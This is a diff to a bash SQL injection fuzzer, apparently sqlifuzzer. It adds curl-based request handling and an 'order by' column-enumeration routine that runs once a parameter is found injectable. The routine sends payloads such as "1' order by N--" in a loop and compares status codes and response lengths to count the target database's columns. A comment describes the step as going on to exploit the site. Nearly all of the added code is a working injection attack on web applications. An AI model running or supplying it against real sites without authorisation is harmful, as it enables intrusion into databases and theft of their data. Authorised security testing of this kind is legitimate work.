@@ -12,6 +12,185 @@ timedelaythreshhold="1"
 # set the search term to a non-null value to prevent a match on an blank value:
 ErrorString="foo123rewerwer435345345345"
 
+# function definitions
+
+requester()
+{
+#recieves badparams (a string of all params, including the fuzzed param)
+#returns: 
+#	request - a string - the request sent in sqlifuzzer format
+#	response - a string - containing the httpcode,length and duration of the response
+if [[ $method != "POST" ]]; then #we're doing a get - simples					
+	# send a 'normal' request
+	response=`curl $uhostname$page"?"$badparams -o dump --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
+	request="$method URL: $uhostname$page"?"$badparams"
+else	# we're doing a POST - not so simple...
+	if (($firstPOSTURIURL>0)) ; then
+		if [ $firstPOSTURIURL == 1 ] ; then #we want to fuzz the POSTURI params, NOT the data
+			response=`curl -d "$static" $uhostname$page"?"$badparams -o dump --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
+			request="$method URL: $uhostname$page?$badparams??$static" 	
+		fi
+		if [ $firstPOSTURIURL == 2 ] ; then #we want to fuzz the POST data params, NOT the POSTURI params
+			response=`curl -d "$badparams" $uhostname$page -o dump --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
+			request="$method URL: $uhostname$page??$badparams" 
+		fi
+	else #just a normal POST:
+		response=`curl -d "$badparams" $uhostname$page -o dump --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
+		request="$method URL: $uhostname$page?$badparams" 		
+	fi
+fi
+}
+
+
+orderbycheck()
+{
+#need to check we have a valid orderby test string
+badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+order+by+9659$end"`
+requester
+status999=`echo $response | cut -d ":" -f 1`
+length999=`echo $response | cut -d ":" -f 2`
+
+badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+order+by+1$end"`
+requester
+status1=`echo $response | cut -d ":" -f 1`
+length1=`echo $response | cut -d ":" -f 2`
+ordlngthdiff=0
+((lendiff=$length1-$length999))
+if [[ "$lendiff" -gt 4 || "$lendiff" -lt 4 ]] ; then
+	ordlngthdiff=1
+fi
+}
+
+orderby()
+{
+#function to determine the number of columns in a where clause
+
+#recieves: 
+#	$payload (the clean, unencoded payload) to look for SQLi metachars at begininng and end of payload
+#	$outputstore which holds the current paramstring (the encoded payload and the other unfuzzed params)
+#returns:
+#	$badparams a version of the paramstring taken from outputstore with the fuzzed payload replaced with an order by
+#	$outputs enumerated column number info to the screen 		
+
+#this code looks at the exploit payload and tries to determine the SQLi metacharacters used:
+#was there a single quote at the begining? was there a comment char (- or #) at the end?
+#these may be needed to encapsulate our our 'order by x' payload for it to work 
+firstchar="${payload:1:1}"
+if [[ "$firstchar" == "'" ]] ; then	
+	quote="'"
+else
+	quote=""
+fi
+
+#echo "Debug $payload"
+lastchar="${payload: -1}"
+if [[ "$lastchar" == "-" ]] ; then
+	end="--"
+elif [[ "$lastchar" == "#" ]] ; then
+	end="#"
+else
+	end=""
+fi
+
+orderbycheck
+
+#echo "$request"
+
+echo "Order by 1 got a $status1 response, order by 9659 got a $status999 response"
+
+#if you get two non-200 status's back, both 'order by x' requests failed; append an '--' on the end: 
+if [[ "$status1" != "200" && "$status1" == "$status999" ]] ; then
+	end="--"
+	orderbycheck
+fi
+
+#if status1 is different from status999 and status1 was a 200 you should be golden!
+success=0
+if [[ "$status1" != "$status999" && "$status1" == "200" ]] ; then
+	# a difference between the two order by statements - we are good for order by column number enum
+	echo "Attempting to determine the number of columns"
+	count=1
+	columns=150
+	while [[ $count -lt $columns ]] ; do
+			badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+order+by+$count$end"`
+			requester
+			statusX=`echo $response | cut -d ":" -f 1`
+			if [[ "$statusX" != "$status1" ]] ; then 
+				((colno=$count-1))
+				echo -e '\E[31;48m'"\033[1m[ORDER BY: $colno COL REQ:$K] $request\033[0m"
+				tput sgr0 # Reset attributes.
+				echo "[ORDER BY: $colno COL REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
+				success=1
+				break 
+			fi
+			let "count+=1"
+	done
+fi
+
+#if the above didnt work out,
+#repeat the above, appending a # instead of --
+if [[ "$success" == 0 ]] ; then
+	if [[ "$status1" != "200" && "$status1" == "$status999" ]] ; then
+		end="#"
+		orderbycheck
+	fi
+
+	if [[ "$status1" != "$status999" && "$status1" == "200" ]] ; then
+		# a difference between the two order by statements - we are good for order by column number enum
+		echo "Attempting to use 'order by x' to determine the number of columns"
+		count=1
+		columns=150
+		while [[ $count -lt $columns ]] ; do
+				echo -n "."
+				badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+order+by+$count$end"`
+				requester
+				statusX=`echo $response | cut -d ":" -f 1`
+				if [[ "$statusX" != "$status1" ]] ; then
+					echo "" 
+					((colno=$count-1))
+					echo -e '\E[31;48m'"\033[1m[ORDER BY: $colno COL REQ:$K] $request\033[0m"
+					tput sgr0 # Reset attributes.
+					echo "[ORDER BY: $colno COL REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
+					success=1
+					break 
+				fi
+				let "count+=1"
+		done
+	fi
+fi
+
+#ok, lets say you have an app that did show a difference between order by 1 and order by 908098, BUT not in the status, in the response length:
+if [[ "$success" == 0 ]] ; then
+	#end is currently set to #
+	orderbycheck
+	if [[ "$status1" == "200" && "$ordlngthdiff" == "1" ]] ; then
+		# a difference IN LENGTH between the two order by statements - we are good for order by column number enum
+		echo "Attempting to use 'order by x' to determine the number of columns"
+		count=1
+		columns=150
+		while [[ $count -lt $columns ]] ; do
+				echo -n "."
+				badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+order+by+$count$end"`
+				requester
+				lengthX=`echo $response | cut -d ":" -f 2`
+				if [[ "$lengthX" != "$length1" ]] ; then
+					echo "" 
+					((colno=$count-1))
+					echo -e '\E[31;48m'"\033[1m[ORDER BY: $colno COL REQ:$K] $request\033[0m"
+					tput sgr0 # Reset attributes.
+					echo "[ORDER BY: $colno COL REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
+					success=1
+					break 
+				fi
+				let "count+=1"
+		done
+	fi
+fi
+
+
+}
+
+
 #remove any residual files left lying about: 
 rm cleanscannerinputlist.txt 2>/dev/null
 rm 0 2>/dev/null
@@ -253,6 +432,7 @@ else
 	httpssupport=""	
 fi
 
+#TODO theres something fishy in the below??? figure it out and sort it...
 #unless we are using an .input file, the safelogname should be the $burplog path value
 if [[ true != "$I" ]]; then
 	safelogname=`echo $burplog | replace " " "" | replace "/" "SLASH" | replace ":" "." | replace '\' ''`
@@ -544,7 +724,7 @@ entries=`wc -l cleanscannerinputlist.txt | cut -d " " -f 1`
 echo ""
 echo "Scan list created with $entries entries" 
 echo "Saving a .input file (including risky requests) to: ./session/$safehostname.$safelogname.input" 
-cp scannerinputlist.txt "./session/$safehostname.$safelogname.input"
+cp scannerinputlist.txt ./session/$safehostname.$safelogname.input
 
 rm scannerinputlist.txt 2>/dev/null
 
@@ -718,8 +898,9 @@ firstPOSTURIURL=0
 # 1 postURI param detected, fuzz the postURI params, send the post data params as a static string
 # 2 postURI param detected, fuzz the post data params, send the postURI params as a static string
 
-firstrunflag=0
-			
+firstrunflag=0	
+vulnerable=0
+
 echo "" > ./session/$safehostname.$safelogname.oldURL.txt
 echo "" > ./session/$safehostname.$safelogname.oldparamlist.txt
 
@@ -1001,7 +1182,7 @@ cat cleanscannerinputlist.txt | while read i; do
 					fi
 					#end of request section
 					#beginning of response parsing section
-
+                                        
 					#check the response code and alert the user if its not 200:					
 					reponseStatusCode=`echo $and1eq2 | cut -d ":" -f 1`;
 					if [[ "$reponseStatusCode" != "200" && "$reponseStatusCode" != "404" ]]
@@ -1076,9 +1257,10 @@ cat cleanscannerinputlist.txt | while read i; do
 						then ((answer=$SQLequallength-$SQLunequallength))
 						SQLequallength=""
 						SQLunequallength=""
-						#if [ $answer -gt 4 ] || [ $answer -lt -4 ] ; then
 						# the payload is an or 1=1: if its not longer, its not worked
 						if [ $answer -gt 4 ] ; then
+						#set the vulnerable flag and sploit that mutha
+						vulnerable=1
 						#this line writes out the difference between the responses from the 'clean' and 'evil' requests: 
 						diff ./dump ./dumpfile --suppress-common-lines > ./responsediffs/$safefilename-respdiff-R-$K-P-$payloadcounter.txt
 							if [[ $method != "POST" ]]; then #we're doing a get - simples 
@@ -1132,6 +1314,8 @@ cat cleanscannerinputlist.txt | while read i; do
 							and1eq2time=`echo "$and1eq2" | cut -d ":" -f 3| cut -d "." -f1`
 							((time_diff=and1eq2time-and1eq1time))
 							if (($and1eq2time>$and1eq1time)) ; then
+							#set the vulnerable flag and sploit that mutha
+							vulnerable=1
 								if [[ $method != "POST" ]] ; then #we're doing a get - simples
 									echo "[TIME-DELAY-"$time_diff"SEC REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safefilename$safelogname.txt 
 									echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC REQ:$K]\033[0m $method URL: $uhostname$page"?"$output"
@@ -1159,15 +1343,22 @@ cat cleanscannerinputlist.txt | while read i; do
 						#end of time diff scan	
 					fi
 					#gotta clear down the output buffer:					
+					outputstore=$output					
 					output=''
 				fi						
-			done 
+			done
+		#for each payload the vulnerable flag is tested; if true, we call the orderby function to enumerate columns  
+		if [[ $vulnerable == 1 ]] ; then
+			orderby
+		fi 
+		vulnerable=0
 		#echo "DEBUG 001 sessionStorage=$sessionStorage"
-		##END OF PER-PAYLOAD LOOP:		
+		##END OF PER-PAYLOAD LOOP:	
 		done
 	#echo "DEBUG 002 sessionStorage=$sessionStorage"
 	((paramflag=$paramflag+1))
 	##END OF PER-PARAMETER LOOP:
+	vulnerable=0
 	done
 ##END OF PER-URL LOOP:
 #code that stores the current URL and params for comparison against the next URL - this can be used to skip params already scanned
